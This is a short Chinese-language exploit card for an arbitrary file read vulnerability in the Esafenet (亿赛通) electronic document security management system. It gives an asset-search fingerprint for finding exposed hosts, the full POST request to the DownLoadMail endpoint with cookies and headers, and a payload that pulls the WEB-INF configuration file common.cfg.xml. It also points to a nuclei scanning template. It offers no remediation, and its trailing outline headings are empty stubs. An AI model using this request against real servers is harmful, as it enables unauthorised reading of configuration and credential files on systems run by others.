# 亿赛通电子文档安全管理系统DownLoadMail存在任意文件读取漏洞

- **系统**：亿赛通电子文档安全管理系统　|　**类型**：任意文件读取/写入　|　**CVE**：—
- **指纹**：`app.name="ESAFENET 亿赛通文档安全管理系统"`
- **请求**：`POST /CDGServer3/esafenet/DownLoadMail HTTP/1.1`
- **关键头**：`Host: {hostname}`　`Cookie: JSESSIONID=F0F476C5479EB3F01A61D1C7DF8ECB3F; JSESSIONID=0F2F97A8E40DE2E33C592268…`　`Sec-Fetch-User: ?1`　`Content-Type: application/x-www-form-urlencoded`　`Content-Length: 42`

**请求体 / payload**
```
path=/WEB-INF/classes/&name=common.cfg.xml

nuclei脚本\
\[亿赛通电子文档安全管理系统-downloadmail-文件读取.yaml]\(公众号：渗透安全HackTwo>
```

**其他**
- 亿赛通电子文档安全管理系统DownLoadMail存在任意文件读取漏洞: * 一、漏洞简介
* 二、影响版本
* 三、资产测绘
* 四、漏洞复现
***
- 版本: * 亿赛通电子文档安全管理系统